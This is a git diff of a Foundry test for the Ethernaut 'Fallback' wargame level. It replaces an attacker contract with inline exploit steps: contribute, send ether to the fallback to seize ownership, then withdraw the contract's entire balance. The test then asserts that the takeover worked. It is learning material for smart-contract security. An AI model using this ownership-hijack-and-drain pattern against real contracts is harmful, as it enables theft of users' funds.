@@ -3,13 +3,11 @@ pragma solidity 0.8.0;
 
 import {Test} from "forge-std/Test.sol";
 import {Ethernaut} from "../../src/Ethernaut.sol";
-import {FallbackAttacker} from "../../src/2-fallback/FallbackAttacker.sol";
 import {Fallback} from "../../src/2-fallback/Fallback.sol";
 
-contract FallbackAttackerTest is Test{
+contract FallbackAttackTest is Test{
   Ethernaut ethernaut;
   Fallback fallbackContract;
-  FallbackAttacker sut;
   address owner;
   uint256 INITIAL_BALANCE = 1e18;
   
@@ -18,8 +16,6 @@ contract FallbackAttackerTest is Test{
     ethernaut = new Ethernaut();
     owner = vm.addr(3);
     vm.deal(address(owner), INITIAL_BALANCE);
-    vm.prank(owner);
-    sut = new FallbackAttacker(address(fallbackContract));
   }
 
   function testShouldStealContractBalance() public{
@@ -37,12 +33,20 @@ contract FallbackAttackerTest is Test{
     // attack
     vm.startPrank(owner);
 
-    sut.attack{value: 2}();
+    // Contributing
+    fallbackContract.contribute{value: 1}();
+    
+    // Sending eth
+    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
+    if(!success) revert();
+
+    // Withdrawing all eth
+    fallbackContract.withdraw();
 
     vm.stopPrank();
 
-    assertEq(fallbackContract.contributions(address(sut)), 1);
-    assertEq(fallbackContract.owner(), address(sut));
+    assertEq(fallbackContract.contributions(owner), 1);
+    assertEq(fallbackContract.owner(), owner);
     assertEq(address(owner).balance, INITIAL_BALANCE + 200);
   }
 }
